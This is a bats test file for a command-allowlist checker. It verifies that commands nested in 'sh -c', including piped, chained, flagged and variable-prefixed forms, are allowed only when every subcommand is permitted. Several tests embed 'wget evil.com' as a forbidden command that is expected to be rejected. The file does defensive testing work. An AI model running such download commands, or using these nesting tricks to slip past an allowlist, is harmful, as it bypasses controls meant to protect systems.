# sh -c {{{
@test "sh -c validates subcommands" {
  run command-in-list "sh -c 'echo hello; tail file'" -- "echo" "tail"
  [ $status -eq 0 ]
}
@test "sh -c with single allowed command" {
  run command-in-list "sh -c 'echo test'" -- "echo"
  [ $status -eq 0 ]
}
@test "forbidden command nested in sh -c" {
  run command-in-list "sh -c 'wget evil.com'" -- "echo"
  [ $status -eq 1 ]
}
@test "forbidden command in long form sh -c" {
  run command-in-list "sh -c 'echo ok && wget evil.com'" -- "echo"
  [ $status -eq 1 ]
}
@test "forbidden sh -c with flags before -c" {
  run command-in-list "sh -x -e -c 'echo ok && wget evil.com'" -- "echo"
  [ $status -eq 1 ]
}
@test "allowd sh -c with flags before -c" {
  run command-in-list "sh -x -e -c 'echo ok && touch test'" -- "echo" "touch"
  [ $status -eq 0 ]
}
@test "variable definition before sh -c" {
  run command-in-list "FOO=bar sh -c 'wget evil.com'" -- "echo"
  [ $status -eq 1 ]
}
@test "chained sh -c with forbidden command" {
  run command-in-list "sh -c 'echo hello' | sh -c 'wget evil'" -- "echo"
  [ $status -eq 1 ]
}
@test "sh without -c should be rejected" {
  run command-in-list "echo hello | sh" -- "echo"
  [ $status -eq 1 ]
}
@test "sh with other flags but no -c should be rejected" {
  run command-in-list "sh -x script.sh" -- "echo"
  [ $status -eq 1 ]
}
# }}}
